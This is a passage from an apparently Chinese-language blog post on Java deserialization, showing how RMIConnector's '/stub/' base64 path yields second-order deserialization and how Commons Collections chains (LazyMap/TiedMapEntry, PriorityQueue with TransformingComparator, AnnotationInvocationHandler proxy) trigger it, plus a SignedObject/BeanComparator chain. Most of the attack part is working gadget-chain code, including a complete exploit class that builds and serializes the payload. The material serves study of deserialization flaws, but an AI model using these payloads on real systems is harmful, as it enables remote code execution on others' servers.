四、HashMap.readObject()-&gt;BadAttributeValueExpException.readObject()-&gt;BadAttributeValueExpException.toString()-&gt;**com.alibaba.fastjson.JSONObject.toString()/com.alibaba.fastjson.JSONArray.toString()**-&gt;com.alibaba.fastjson.JSON.toString()-&gt;com.alibaba.fastjson.JSON.toJSONString()-&gt;com/alibaba/fastjson/serializer/JSONSerializer.java#write()-&gt;com/alibaba/fastjson/serializer/ASMSerializerFactory.javacreateJavaBeanSerializer(SerializeBeanInfo beanInfo) -&gt;SignedObject.getObject()</span><br><span class="hljs-comment">////        JSONObject jsonObject = new JSONObject();</span><br><span class="hljs-comment">////        jsonObject.put(&quot;222&quot;,signedObject);</span><br><span class="hljs-comment">//        JSONArray objects = new JSONArray();</span><br><span class="hljs-comment">//        objects.add(signedObject);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        BadAttributeValueExpException val1 = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        setFieldValue(val1, &quot;val&quot;, objects);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap1.put(signedObject,val1);</span><br><br><span class="hljs-comment">//        五、PriorityQueue.readObect()-&gt; org.apache.commons.beanutils.BeanComparator.compare()-&gt;PropertyUtils.getProperty()-&gt;SignedObject.getObject()-&gt;PropertyUtilsBean.java#getSimpleProperty()-&gt;SignedObject.getObject()</span><br>        BeanComparator&lt;Object&gt; objectBeanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;();<br>        setFieldValue(objectBeanComparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>);<br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(<span class="hljs-number">1</span>);<br><br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,objectBeanComparator);<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        Object[] objects = &#123;signedObject, <span class="hljs-number">1</span>&#125;;<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,objects);<br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">ser2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser2&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(ser2);<br>        oos.writeObject(priorityQueue);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser2&quot;</span>));<br>        ois.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01  分析"></a>0x01  分析</h3><p>javax.management.remote.rmi.RMIConnector#findRMIServerJRMP()</p><p><img src="image-20240118001634774.png" alt="image-20240118001634774"></p><p><img src="image-20240118001428885.png" alt="image-20240118001428885"></p><p>可以看到传入base64字节，然后转object流，然后序列化</p><p>往上跟</p><p>javax.management.remote.rmi.RMIConnector#findRMIServer()</p><p><img src="image-20240118001855185.png" alt="image-20240118001855185"></p><p>可以看到以“&#x2F;stub&#x2F;”开头就会调用findRMIServerJRMP()</p><p>javax.management.remote.rmi.RMIConnector#connect()</p><p><img src="image-20240118002403207.png" alt="image-20240118002403207"></p><p><img src="image-20240118002245659.png" alt="image-20240118002245659"></p><p>可以看见rmiServer等于空就回调用findRMIServer()</p><p>查看构造方法</p><p><img src="image-20240118002459279.png" alt="image-20240118002459279"></p><p><img src="image-20240118002515910.png" alt="image-20240118002515910"></p><p>可以看见构造方法符合条件。</p><p><img src="image-20240118002840672.png" alt="image-20240118002840672"></p><p>JMXServiceURL必须为service:jmx:开头。</p><p><img src="image-20240118003522640.png" alt="image-20240118003522640"></p><p>这里获取JMXServiceURL的URLPATH，然后URLPATH要以&#x2F;stub&#x2F;开头，截取第6位到末位的字符传入触发二次反序列化。</p><p>所以new一个JMXServiceURL对象，然后反射赋值就行。最后构造RMIConnector。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+serbase64);<br><span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><h3 id="0x02-构造"><a href="#0x02-构造" class="headerlink" title="0x02 构造"></a>0x02 构造</h3><p>由于我们要出发connect()，它不是javabean，所以有很多限制，佬们想到的是cc的invoketransfrom来触发。</p><p>既然是cc触发，说实话，如大佬所说鸡肋。</p><p>cc链触发，很容易想到cc4.0用PriorityQueue，cc 3.2.1一下用lazymap.get()</p><h4 id="一、cc6前半"><a href="#一、cc6前半" class="headerlink" title="一、cc6前半"></a>一、cc6前半</h4><p>hashmap.readObject()-&gt;hash(key)-&gt;key.hashcode-&gt;tiedMapEntry.hashcode-&gt;tiedMapEntry.getValue-&gt;lazyMap.get()-&gt;invokerTransformer.Transformer()-&gt;rmiConnector.connect()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate( <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, rmiConnector);<br><br>HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xx&quot;</span>);<br>lazyMap.clear();<br>setFieldValue(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>, invokerTransformer);<br></code></pre></td></tr></table></figure><h4 id="二、-cc4-0、PriorityQueue"><a href="#二、-cc4-0、PriorityQueue" class="headerlink" title="二、 cc4.0、PriorityQueue"></a>二、 cc4.0、PriorityQueue</h4><p>PriorityQueue.readObject()-&gt;PriorityQueue.siftDownUsingComparator()-&gt;TransformingComparator.comparator()-&gt;InvokerTransformer.transformer()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer);<br><br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>);<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>Object[] objects = &#123;rmiConnector, <span class="hljs-number">1</span>&#125;;<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,objects);<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,comparator);<br></code></pre></td></tr></table></figure><h4 id="三、-cc3-2-1-cc4-动态代理"><a href="#三、-cc3-2-1-cc4-动态代理" class="headerlink" title="三、 cc3.2.1 cc4  动态代理"></a>三、 cc3.2.1 cc4  动态代理</h4><p>AnnotationInvocationHandler.readObject-&gt;AnnotationInvocationHandler.invoke-&gt;DefaultedMap.get()-&gt;transformerChain.transformer()-&gt;InvokerTransformer.transformer()-&gt;rmiConnector.connect()</p><p>CC4 没有lazymap了， 改用defaultedMap即可。cc1都可以用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(rmiConnector),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>DefaultedMap&lt;Object, Optional&lt;ConstantTransformer&gt;&gt; defaultedMap =<br>        DefaultedMap.defaultedMap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), Optional.of(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)));<br>setFieldValue(defaultedMap,<span class="hljs-string">&quot;value&quot;</span>, transformerChain);<br><br>Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; Anotationdeclared =<br>        AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>Anotationdeclared.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) Anotationdeclared.newInstance(Override.class, defaultedMap);<br><span class="hljs-type">Map</span> <span class="hljs-variable">Mapproxy</span> <span class="hljs-operator">=</span>(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Anotationdeclared.newInstance(Override.class,Mapproxy);<br></code></pre></td></tr></table></figure><h3 id="0x03-完整exp-1"><a href="#0x03-完整exp-1" class="headerlink" title="0x03 完整exp"></a>0x03 完整exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.towser;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.tmp.cc.cc1;<br><span class="hljs-keyword">import</span> com.tmp.cc.cc5;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.map.DefaultedMap;<br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">rmiconnector</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;ser2&quot;</span>);<br>        <span class="hljs-type">byte</span>[] fileBytes = Files.readAllBytes(file.toPath());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(fileBytes);<br><br><br>        <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>        setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+base64);<br>        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">//        一、cc6前半</span><br><span class="hljs-comment">//        hashmap.readObject()-&gt;hash(key)-&gt;key.hashcode-&gt;tiedMapEntry.hashcode-&gt;tiedMapEntry.getValue-&gt;lazyMap.get()-&gt;invokerTransformer.Transformer()-&gt;rmiConnector.connect()</span><br><span class="hljs-comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate( new HashMap&lt;&gt;(), new ConstantTransformer(1));</span><br><span class="hljs-comment">//        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        expMap.put(tiedMapEntry, &quot;xx&quot;);</span><br><span class="hljs-comment">//        lazyMap.clear();</span><br><span class="hljs-comment">//        setFieldValue(lazyMap,&quot;factory&quot;, invokerTransformer);</span><br><br><span class="hljs-comment">//        二、 cc4.0、PriorityQueue</span><br><span class="hljs-comment">//        PriorityQueue.readObject()-&gt;PriorityQueue.siftDownUsingComparator()-&gt;TransformingComparator.comparator()-&gt;InvokerTransformer.transformer()</span><br><span class="hljs-comment">//        InvokerTransformer transformer = new InvokerTransformer(&quot;connect&quot;, null, null);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        TransformingComparator comparator = new TransformingComparator(transformer);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        PriorityQueue priorityQueue = new PriorityQueue(1);</span><br><span class="hljs-comment">//        setFieldValue(priorityQueue,&quot;size&quot;,2);</span><br><span class="hljs-comment">//        Object[] objects = &#123;rmiConnector, 1&#125;;</span><br><span class="hljs-comment">//        setFieldValue(priorityQueue,&quot;queue&quot;,objects);</span><br><span class="hljs-comment">//        setFieldValue(priorityQueue,&quot;comparator&quot;,comparator);</span><br><br><span class="hljs-comment">//     三、 cc3.2.1 cc4  动态代理</span><br><span class="hljs-comment">//        AnnotationInvocationHandler.readObject-&gt;AnnotationInvocationHandler.invoke-&gt;DefaultedMap.get()-&gt;transformerChain.transformer()-&gt;InvokerTransformer.transformer()-&gt;rmiConnector.connect()</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(rmiConnector),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        DefaultedMap&lt;Object, Optional&lt;ConstantTransformer&gt;&gt; defaultedMap =<br>                DefaultedMap.defaultedMap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), Optional.of(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)));<br>        setFieldValue(defaultedMap,<span class="hljs-string">&quot;value&quot;</span>, transformerChain);<br><br>        Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; Anotationdeclared =<br>                AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>        Anotationdeclared.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) Anotationdeclared.newInstance(Override.class, defaultedMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">Mapproxy</span> <span class="hljs-operator">=</span>(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Anotationdeclared.newInstance(Override.class,Mapproxy);<br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">ser2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;RMIC2&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(ser2);<br>        oos.writeObject(instance);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;RMIC2&quot;</span>));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="累了，下次再写。"><a href="#累了，下次再写。" class="headerlink" title="累了，下次再写。"></a>累了，下次再写。</h2><h3 id="佬的剑招"><a href="#佬的剑招" class="headerlink" title="佬的剑招"></a>佬的剑招</h3><p><a href="https://tttang.com/archive/1701/#toc_cc">https://tttang.com/archive/1701/#toc_cc</a></p><p><a href="https://su18.org/">https://su18.org/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
